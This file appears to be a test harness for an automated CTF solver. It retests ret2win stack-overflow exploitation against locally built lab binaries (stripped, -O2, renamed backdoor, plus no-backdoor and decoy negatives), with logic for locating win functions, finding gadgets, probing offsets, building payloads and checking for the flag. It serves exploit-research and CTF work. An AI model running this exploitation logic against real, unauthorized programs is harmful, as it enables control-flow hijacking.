@@ -1,0 +1,473 @@
+"""
+v017_ret2win_retest.src — ret2win 复测：stripped / -O2 / 函数改名
+
+为什么要回来测
+    用户明确要求："ret2win 的题少，但分值多"。v014 只在自编译、带符号的
+    O0 二进制上验证过。真实赛题常见三种削弱：
+        -O2        编译器重排、内联，栈帧和地址都变
+        -s         符号表被剥离，`symbols["win"]` 直接失效
+        函数改名   符号还在，但不再叫 win
+    这三种情况下，v014 的"按符号找后门"会失败。本版本验证两条补救路线：
+        1. 符号启发式（名字含 win/backdoor/flag…）
+        2. **字符串引用**：找到引用 "/tmp/flag.txt"、"flag{" 的函数入口
+    并且所有候选都必须**真实执行**验证，不能看到一个 flag{...} 就宣布成功。
+
+测什么
+    R0  O0   带符号（回归 v014）
+    R1  O2   带符号
+    R2  O2 -s      剥离符号 → 只能靠字符串引用
+    R3  O2   后门改名 helper_a3f9 → 符号启发式失效 → 只能靠字符串引用
+    N1  O2 -s      没有后门、也没有 flag 字样 → 应返回 win_not_found
+    N2  O2 -s      有引用 flag 字样的函数，但给的是假 flag → 应返回 execute_failed
+
+单元
+    elf_info / find_win_candidates / find_gadgets / probe_offset / build_payload
+    与 v014 相同的执行式偏移探测；新增的只有 find_win_candidates。
+
+运行
+    python versions/v017_ret2win_retest.src
+    python versions/v017_ret2win_retest.src --only R2
+
+产出物
+    experiments/EXP-0015/{results.json,report.md}
+    experiments/EXP-0015/ret2win/{vuln.c,vuln_renamed.c,vuln_nowin.c,vuln_decoy.c,+二进制}
+"""
+
+from __future__ import annotations
+
+import json
+import re
+import struct
+import subprocess
+import sys
+import time
+from dataclasses import dataclass, field
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent
+OUT_DIR = ROOT / "experiments" / "EXP-0015"
+PWN_DIR = OUT_DIR / "ret2win"
+
+for _stream in (sys.stdout, sys.stderr):
+    if hasattr(_stream, "reconfigure"):
+        try:
+            _stream.reconfigure(encoding="utf-8", errors="replace")
+        except (ValueError, OSError):
+            pass
+
+
+def log(message: str) -> None:
+    print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)
+
+
+FLAG_RE = re.compile(r"flag\{[^}\n]{1,200}\}", re.IGNORECASE)
+EXPECTED = "flag{ret2win_real_binary}"
+
+
+def _wsl_path(win_path: str) -> str:
+    p = Path(win_path).resolve()
+    drive = p.drive.rstrip(":").lower()
+    return f"/mnt/{drive}" + str(p)[2:].replace("\\", "/")
+
+
+# --------------------------------------------------------------------------------------
+# ELF 事实
+# --------------------------------------------------------------------------------------
+
+@dataclass
+class ElfFacts:
+    path: str
+    is_pie: bool
+    has_canary: bool
+    has_nx: bool
+    relro: str
+    symbols: dict[str, int] = field(default_factory=dict)
+    imports: set[str] = field(default_factory=set)
+    text_addr: int = 0
+    text_size: int = 0
+    text_data: bytes = b""
+
+
+def elf_info(path: str) -> ElfFacts:
+    from elftools.elf.elffile import ELFFile
+
+    with open(path, "rb") as handle:
+        elf = ELFFile(handle)
+        is_pie = elf["e_type"] == "ET_DYN"
+        symbols: dict[str, int] = {}
+        imports: set[str] = set()
+        for section_name in (".symtab", ".dynsym"):
+            section = elf.get_section_by_name(section_name)
+            if section is None:
+                continue
+            for symbol in section.iter_symbols():
+                if not symbol.name:
+                    continue
+                imports.add(symbol.name)
+                if symbol["st_value"]:
+                    symbols.setdefault(symbol.name, symbol["st_value"])
+        has_canary = "__stack_chk_fail" in imports or "__stack_chk_guard" in imports
+        has_nx = False
+        for segment in elf.iter_segments():
+            if segment["p_type"] == "PT_GNU_STACK":
+                has_nx = not bool(segment["p_flags"] & 0x1)
+        relro = "partial"
+        for segment in elf.iter_segments():
+            if segment["p_type"] == "PT_GNU_RELRO":
+                relro = "full" if elf.get_section_by_name(".got.plt") is None else "partial"
+        text = elf.get_section_by_name(".text")
+        text_addr, text_size, text_data = text["sh_addr"], text["sh_size"], text.data()
+
+    return ElfFacts(path=path, is_pie=is_pie, has_canary=has_canary,
+                    has_nx=has_nx, relro=relro, symbols=symbols, imports=imports,
+                    text_addr=text_addr, text_size=text_size, text_data=text_data)
+
+
+# --------------------------------------------------------------------------------------
+# 找后门：符号启发式 + 字符串引用
+# --------------------------------------------------------------------------------------
+
+INTERESTING = (b"/tmp/flag", b"flag{", b"/bin/sh", b"cat ", b"flag.txt")
+
+
+def _c_strings(elf) -> list[tuple[int, bytes]]:
+    """枚举只读数据里的 C 字符串（虚拟地址 + 内容）。"""
+    strings: list[tuple[int, bytes]] = []
+    for name in (".rodata", ".data.rel.ro", ".data"):
+        section = elf.get_section_by_name(name)
+        if section is None:
+            continue
+        data, base = section.data(), section["sh_addr"]
+        pos = 0
+        while pos < len(data):
+            end = data.find(b"\x00", pos)
+            if end < 0:
+                break
+            if end > pos:
+                strings.append((base + pos, data[pos:end]))
+            pos = end + 1
+    return strings
+
+
+def find_win_candidates(path: str, facts: ElfFacts) -> list[dict]:
+    """返回按可信度排序的后门候选。
+
+    路线 1（符号）：名字里带 win / backdoor / getshell / flag。
+    路线 2（字符串引用）：找到 `lea reg, [rip+X]` 指向含 flag 字样的字符串，
+                         再把该指令所在的函数入口当作候选。
+    两条路线都只产出候选，**能不能拿 flag 必须靠真实执行验证**。
+    """
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+    from elftools.elf.elffile import ELFFile
+
+    candidates: list[dict] = []
+
+    # 路线 1：符号
+    text_lo, text_hi = facts.text_addr, facts.text_addr + facts.text_size
+    symbol_hits = []
+    pattern = re.compile(r"(^|[_\W])(win|backdoor|getshell|shell|flag)", re.IGNORECASE)
+    for name, addr in facts.symbols.items():
+        if not (text_lo <= addr < text_hi):
+            continue
+        if pattern.search(name):
+            symbol_hits.append((name, addr))
+    # 精确的 "win" 排最前
+    symbol_hits.sort(key=lambda item: (item[0] != "win", item[0]))
+    for name, addr in symbol_hits:
+        candidates.append({"addr": addr, "via": f"symbol:{name}"})
+
+    # 路线 2：字符串引用
+    with open(path, "rb") as handle:
+        elf = ELFFile(handle)
+        wanted = {addr: text for addr, text in _c_strings(elf)
+                  if any(token in text for token in INTERESTING)}
+
+    if wanted:
+        engine = Cs(CS_ARCH_X86, CS_MODE_64)
+        instructions = list(engine.disasm(facts.text_data, facts.text_addr))
+        for index, instruction in enumerate(instructions):
+            if instruction.mnemonic != "lea" or "rip" not in instruction.op_str:
+                continue
+            match = re.search(r"\[rip \+ (0x[0-9a-fA-F]+)\]", instruction.op_str)
+            if not match:
+                continue
+            target = instruction.address + instruction.size + int(match.group(1), 16)
+            if target not in wanted:
+                continue
+            function_start = _enclosing_function(instructions, index)
+            if function_start is None:
+                continue
+            preview = wanted[target][:32].decode("latin-1")
+            candidates.append({"addr": function_start,
+                               "via": f"string_ref:{preview}"})
+
+    # 去重，保留首次出现的顺序
+    seen: set[int] = set()
+    unique: list[dict] = []
+    for candidate in candidates:
+        if candidate["addr"] in seen:
+            continue
+        seen.add(candidate["addr"])
+        unique.append(candidate)
+    return unique[:8]
+
+
+def _enclosing_function(instructions, index: int) -> int | None:
+    """从命中指令向前找函数入口：优先 16 字节对齐的 endbr64，其次 push rbp。
+
+    注意不能"遇到 push rbp 就停"——-O2 的函数常常是
+    `endbr64; push r12; push rbp`，往回扫会先撞到 push rbp，
+    把入口报成函数中间。必须先在整段里找 endbr64。
+    """
+    for back in range(index, -1, -1):
+        instruction = instructions[back]
+        if instruction.mnemonic == "endbr64" and instruction.address % 16 == 0:
+            return instruction.address
+    for back in range(index, -1, -1):
+        instruction = instructions[back]
+        if instruction.mnemonic == "push" and instruction.op_str == "rbp":
+            return instruction.address
+    return None
+
+
+# --------------------------------------------------------------------------------------
+# gadget / 偏移 / payload
+# --------------------------------------------------------------------------------------
+
+def find_gadgets(facts: ElfFacts) -> dict[str, int]:
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+
+    engine = Cs(CS_ARCH_X86, CS_MODE_64)
+    instructions = list(engine.disasm(facts.text_data, facts.text_addr))
+    gadgets: dict[str, int] = {}
+    for index in range(len(instructions) - 1):
+        first, second = instructions[index], instructions[index + 1]
+        if first.mnemonic == "pop" and second.mnemonic == "ret":
+            gadgets.setdefault(f"pop {first.op_str}; ret", first.address)
+    for instruction in instructions:
+        if instruction.mnemonic == "ret":
+            gadgets.setdefault("ret", instruction.address)
+            break
+    return gadgets
+
+
+_PROBE_SCRIPT = r"""
+import re, struct, subprocess, sys
+binary = sys.argv[1]
+order = [int(x) for x in sys.argv[2].split(",") if x]
+marker = 0xDEADBEEF
+marker_bytes = struct.pack("<Q", marker)
+pattern = re.compile(r"rip=(0x[0-9a-fA-F]+)")
+for n in order:
+    proc = subprocess.run([binary], input=b"A" * n + marker_bytes, capture_output=True)
+    err = proc.stderr.decode("utf-8", "replace")
+    match = pattern.search(err)
+    if match and int(match.group(1), 16) == marker:
+        print("OFFSET", n)
+        sys.exit(0)
+print("OFFSET -1")
+"""
+
+
+def probe_offset(wsl_path: str, facts: ElfFacts, max_offset: int = 256) -> dict:
+    hints = _static_hints(facts)
+    order: list[int] = []
+    for hint in hints:
+        for delta in range(-16, 17):
+            candidate = hint + delta
+            if 0 <= candidate <= max_offset and candidate not in order:
+                order.append(candidate)
+    order.extend(n for n in range(0, max_offset + 1) if n not in order)
+
+    try:
+        done = subprocess.run(
+            ["wsl", "-e", "python3", "-c", _PROBE_SCRIPT, wsl_path,
+             ",".join(str(n) for n in order)],
+            capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=180)
+    except subprocess.TimeoutExpired:
+        return {"offset": None, "probes": 0, "static_hints": hints, "ok": False,
+                "error": "probe_timeout"}
+    match = re.search(r"OFFSET\s+(-?\d+)", done.stdout or "")
+    offset = int(match.group(1)) if match else -1
+    if offset < 0:
+        return {"offset": None, "probes": len(order), "static_hints": hints, "ok": False}
+    return {"offset": offset, "probes": order.index(offset) + 1,
+            "static_hints": hints, "ok": True}
+
+
+def _static_hints(facts: ElfFacts) -> list[int]:
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+
+    engine = Cs(CS_ARCH_X86, CS_MODE_64)
+    hints: list[int] = []
+    for instruction in engine.disasm(facts.text_data, facts.text_addr):
+        if instruction.mnemonic == "sub" and instruction.op_str.startswith("rsp,"):
+            try:
+                value = int(instruction.op_str.split(",")[1].strip(), 0)
+            except ValueError:
+                continue
+            for extra in (8, 16):
+                candidate = value + extra
+                if candidate not in hints:
+                    hints.append(candidate)
+    return hints[:4]
+
+
+def build_payload(gadgets: dict[str, int], offset: int, target: int,
+                  align: bool) -> bytes:
+    payload = b"A" * offset
+    if align and gadgets.get("ret") is not None:
+        payload += struct.pack("<Q", gadgets["ret"])
+    payload += struct.pack("<Q", target)
+    return payload
+
+
+def run_binary(wsl_path: str, payload: bytes) -> tuple[int, str, str]:
+    try:
+        done = subprocess.run(["wsl", "-e", wsl_path], input=payload,
+                              capture_output=True, timeout=20)
+    except subprocess.TimeoutExpired:
+        return 124, "", "timeout"
+    return (done.returncode,
+            done.stdout.decode("utf-8", "replace"),
+            done.stderr.decode("utf-8", "replace"))
+
+
+# --------------------------------------------------------------------------------------
+# 解题流程
+# --------------------------------------------------------------------------------------
+
+def solve(path: str, expected: str) -> dict:
+    started = time.perf_counter()
+    steps: list[dict] = []
+    wsl_path = _wsl_path(path)
+
+    facts = elf_info(path)
+    steps.append({"unit": "elf_info", "pie": facts.is_pie, "canary": facts.has_canary,
+                  "nx": facts.has_nx, "relro": facts.relro,
+                  "symbols": len(facts.symbols)})
+
+    if facts.has_canary:
+        steps.append({"unit": "protection_gate", "reason": "canary_present"})
+        return {"solved": False, "reason": "canary_present", "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+    if facts.is_pie:
+        steps.append({"unit": "protection_gate", "reason": "pie_enabled"})
+        return {"solved": False, "reason": "pie_enabled", "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    candidates = find_win_candidates(path, facts)
+    steps.append({"unit": "find_win_candidates", "count": len(candidates),
+                  "candidates": [{"addr": hex(c["addr"]), "via": c["via"]}
+                                 for c in candidates]})
+    if not candidates:
+        steps.append({"unit": "execute", "result": "refused"})
+        return {"solved": False, "reason": "win_not_found", "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    gadgets = find_gadgets(facts)
+    steps.append({"unit": "find_gadgets", "found": sorted(gadgets)[:6]})
+
+    probe = probe_offset(wsl_path, facts)
+    steps.append({"unit": "probe_offset", **probe})
+    if not probe["ok"]:
+        return {"solved": False, "reason": "offset_not_found", "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    # 每个候选 × 两种对齐都真实执行；只有 stdout 出现**期望的** flag 才算成功
+    tried = 0
+    for candidate in candidates:
+        for align in (True, False):
+            payload = build_payload(gadgets, probe["offset"], candidate["addr"], align)
+            tried += 1
+            rc, out, err = run_binary(wsl_path, payload)
+            found = FLAG_RE.search(out)
+            if found and found.group(0).lower() == expected.lower():
+                steps.append({"unit": "execute", "result": "solved",
+                              "via": candidate["via"], "align": align, "tries": tried})
+                return {"solved": True, "reason": None, "via": candidate["via"],
+                        "align": align, "tries": tried, "steps": steps,
+                        "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    steps.append({"unit": "execute", "result": "failed", "tries": tried})
+    return {"solved": False, "reason": "execute_failed", "tries": tried, "steps": steps,
+            "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+
+def main() -> None:
+    import argparse
+
+    parser = argparse.ArgumentParser(description="ret2win 复测")
+    parser.add_argument("--only", default=None)
+    args = parser.parse_args()
+
+    subprocess.run(["wsl", "-e", "bash", "-lc", f"printf '{EXPECTED}\\n' > /tmp/flag.txt"],
+                   timeout=30, capture_output=True)
+
+    cases = [
+        ("R0", "vuln_o0", False, "O0 带符号（回归）"),
+        ("R1", "vuln_o2", False, "O2 带符号"),
+        ("R2", "vuln_o2s", False, "O2 stripped"),
+        ("R3", "vuln_renamed_o2", False, "O2 后门改名为 helper_a3f9"),
+        ("N1", "vuln_nowin_o2s", True, "stripped 且无后门"),
+        ("N2", "vuln_decoy_o2s", True, "有假后门（给错 flag）"),
+    ]
+
+    rows: list[dict] = []
+    for tid, binary, negative, note in cases:
+        if args.only and tid != args.only:
+            continue
+        path = PWN_DIR / binary
+        if not path.exists():
+            log(f"  {tid}: 跳过（靶场不存在：{path}）")
+            continue
+        result = solve(str(path), EXPECTED)
+        rows.append({"id": tid, "binary": binary, "negative": negative, "note": note,
+                     **result})
+        if negative:
+            verdict = "OK(如实拒绝)" if not result["solved"] else "UNEXPECTED"
+        else:
+            verdict = "OK" if result["solved"] else "FAILED"
+        log(f"  {tid}: {verdict:12} {result.get('reason') or result.get('via') or '':24} "
+            f"{result['elapsed_ms']}ms")
+
+    positives = [r for r in rows if not r["negative"]]
+    negatives = [r for r in rows if r["negative"]]
+    summary = {
+        "positive_total": len(positives),
+        "positive_solved": sum(1 for r in positives if r["solved"]),
+        "negative_total": len(negatives),
+        "negative_correctly_refused": sum(1 for r in negatives if not r["solved"]),
+        "mean_elapsed_ms": round(sum(r["elapsed_ms"] for r in rows) / max(len(rows), 1), 1),
+    }
+    log("汇总：" + json.dumps(summary, ensure_ascii=False))
+
+    OUT_DIR.mkdir(parents=True, exist_ok=True)
+    (OUT_DIR / "results.json").write_text(
+        json.dumps({"summary": summary, "rows": rows}, ensure_ascii=False, indent=2),
+        encoding="utf-8")
+
+    lines = ["# EXP-0015 — ret2win 复测（stripped / -O2 / 改名）", "",
+             "验证符号剥离、优化与函数改名后，后门还能不能被定位；",
+             "所有候选都靠真实执行验证，看到一个 `flag{...}` 不算成功。", "",
+             "## 汇总", "", "```json",
+             json.dumps(summary, ensure_ascii=False, indent=2), "```", "",
+             "## 逐题", "", "| 题 | 靶场 | 结果 | 找到方式 / 原因 | 尝试次数 | 耗时 |",
+             "| --- | --- | --- | --- | --- | --- |"]
+    for row in rows:
+        if row["negative"]:
+            mark = "✓ 如实拒绝" if not row["solved"] else "✗ 不该解出"
+            kind = "负样本"
+        else:
+            mark = "✓ 解出" if row["solved"] else "✗ 失败"
+            kind = "正样本"
+        detail = row.get("via") or row.get("reason") or "—"
+        tries = row.get("tries", "—")
+        lines.append(f"| {row['id']} | {row['binary']} | {mark} | {kind}：{detail} "
+                     f"| {tries} | {row['elapsed_ms']}ms |")
+    (OUT_DIR / "report.md").write_text("\n".join(lines), encoding="utf-8")
+    log(f"报告：{OUT_DIR / 'report.md'}")
+
+
+if __name__ == "__main__":
+    main()
